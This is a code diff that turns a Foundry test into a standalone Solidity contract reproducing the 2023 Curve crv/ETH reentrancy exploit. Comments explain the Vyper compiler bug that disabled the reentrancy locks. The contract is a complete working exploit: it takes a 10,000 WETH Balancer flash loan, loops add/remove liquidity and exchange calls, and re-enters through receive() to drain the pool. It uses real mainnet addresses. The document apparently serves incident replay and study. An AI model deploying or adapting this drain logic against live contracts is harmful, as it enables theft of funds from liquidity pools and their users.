@@ -1,21 +1,37 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
-import "./../interface.sol";
+// Synthetic standalone exploit for the EVM Playground (2023-07-Curve_exp02).
+// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
+// (ContractTest IS the flash-loan receiver AND the reentrant attacker via its
+// own receive()), so there is no standalone contract to deploy. This contract
+// is a faithful, self-contained copy of that inline attack (testExploit's
+// body -> run(), receiveFlashLoan, receive()) so the playground can deploy it
+// and record run(). Logic and constants are copied verbatim from
+// test/Curve_exp02.sol in the registry.
+//
+// Root cause: Curve's crv/ETH crypto-pool (Vyper 0.3.0) requests a
+// `@nonreentrant('lock')` guard on remove_liquidity/remove_liquidity_one_coin/
+// exchange/add_liquidity, but Vyper 0.2.15-0.3.0 mis-compiled that decorator
+// so the lock never actually held. remove_liquidity() pays out ETH via a raw
+// low-level call BEFORE it finishes writing back self.balances/self.D, so the
+// attacker's receive() re-enters add_liquidity()+exchange() while the pool's
+// internal accounting is stale relative to its real balances. Looped 20 times
+// inside a 10,000 WETH Balancer flash loan (0 fee), this drains ~7,929 WETH
+// from the pool in one transaction.
 
-// @KeyInfo - Total Lost : ~41M USD$
-// Attacker : https://etherscan.io/address/0xb752def3a1fded45d6c4b9f4a8f18e645b41b324
-// Attack Contract : https://etherscan.io/address/0x83e056ba00beae4d8aa83deb326a90a4e100d0c1
-// Vulnerable Contract : https://etherscan.io/address/0x8301ae4fc9c624d1d396cbdaa1ed877821d7c511
-// Attack Tx : https://etherscan.io/tx/0x2e7dc8b2fb7e25fd00ed9565dcc0ad4546363171d5e00f196d48103983ae477c
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function approve(address, uint256) external returns (bool);
+    function transfer(address, uint256) external returns (bool);
+}
 
-// @Info
-// Vulnerable Contract Code : https://etherscan.io/address/0x8301ae4fc9c624d1d396cbdaa1ed877821d7c511#code
-
-// @Analysis
-// Post-mortem : https://hackmd.io/@LlamaRisk/BJzSKHNjn
-// Twitter Guy : https://twitter.com/vyperlang/status/1685692973051498497
+interface IWETH9 {
+    function balanceOf(address) external view returns (uint256);
+    function withdraw(uint256 wad) external;
+    function deposit() external payable;
+    function transfer(address, uint256) external returns (bool);
+}
 
 interface ICurve {
     function exchange(
@@ -37,38 +53,37 @@ interface ICurve {
     function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external;
 }
 
-contract ContractTest is Test {
-    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    IERC20 CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
-    IERC20 LP = IERC20(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d);
-    ICurve CurvePool = ICurve(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
-    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    uint256 nonce;
+interface IBalancerVault {
+    function flashLoan(
+        address recipient,
+        address[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
 
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8545", 17_807_829);
-        vm.label(address(WETH), "WETH");
-        vm.label(address(CRV), "CRV");
-        vm.label(address(LP), "LP");
-        vm.label(address(CurvePool), "CurvePool");
-        vm.label(address(Balancer), "Balancer");
-    }
+contract CurveCrvEthDrain {
+    IWETH9 constant WETH = IWETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IERC20 constant CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
+    IERC20 constant LP = IERC20(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d);
+    ICurve constant CURVE_POOL = ICurve(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
+    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
-    function testExploit() external {
-        deal(address(this), 0);
-        CRV.approve(address(CurvePool), type(uint256).max);
+    uint256 public nonce;
+
+    // Entrypoint recorded by the playground (mirrors testExploit()).
+    function run() external {
+        CRV.approve(address(CURVE_POOL), type(uint256).max);
+
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 10_000 ether;
         bytes memory userData = "";
-        Balancer.flashLoan(address(this), tokens, amounts, userData);
-
-        emit log_named_decimal_uint(
-            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
+        BALANCER.flashLoan(address(this), tokens, amounts, userData);
     }
 
+    // Balancer flash-loan callback (mirrors ContractTest.receiveFlashLoan).
     function receiveFlashLoan(
         address[] memory tokens,
         uint256[] memory amounts,
@@ -81,31 +96,35 @@ contract ContractTest is Test {
             uint256[2] memory amount;
             amount[0] = 400 ether;
             amount[1] = 0;
-            CurvePool.add_liquidity{value: 400 ether}(amount, 0, true); // add liquidity
+            CURVE_POOL.add_liquidity{value: 400 ether}(amount, 0, true); // add liquidity
 
             amount[0] = 0;
-            CurvePool.remove_liquidity(LP.balanceOf(address(this)), amount, true); // reentrancy enter point
+            CURVE_POOL.remove_liquidity(LP.balanceOf(address(this)), amount, true); // reentrancy enter point
             nonce++;
 
-            CurvePool.remove_liquidity_one_coin(LP.balanceOf(address(this)), 0, 0, true); // remove liquidity to get eth
+            CURVE_POOL.remove_liquidity_one_coin(LP.balanceOf(address(this)), 0, 0, true); // remove liquidity to get eth
             nonce++;
 
-            CurvePool.exchange(1, 0, CRV.balanceOf(address(this)), 0, true); // swap crv to eth
+            CURVE_POOL.exchange(1, 0, CRV.balanceOf(address(this)), 0, true); // swap crv to eth
             nonce++;
         }
 
         WETH.deposit{value: address(this).balance}();
 
-        WETH.transfer(address(Balancer), amounts[0] + feeAmounts[0]);
+        WETH.transfer(address(BALANCER), amounts[0] + feeAmounts[0]);
     }
 
+    // Reentrant window (mirrors ContractTest.receive()): fires on every 3rd
+    // nonce increment, i.e. once per loop iteration, right after
+    // remove_liquidity() pays out ETH but before the pool finishes writing
+    // back its accounting.
     receive() external payable {
-        if (msg.sender == address(CurvePool) && nonce % 3 == 0) {
+        if (msg.sender == address(CURVE_POOL) && nonce % 3 == 0) {
             uint256[2] memory amount;
             amount[0] = 400 ether;
             amount[1] = 0;
-            CurvePool.add_liquidity{value: 400 ether}(amount, 0, true);
-            CurvePool.exchange{value: 500 ether}(0, 1, 500 ether, 0, true);
+            CURVE_POOL.add_liquidity{value: 400 ether}(amount, 0, true);
+            CURVE_POOL.exchange{value: 500 ether}(0, 1, 500 ether, 0, true);
         }
     }
 }
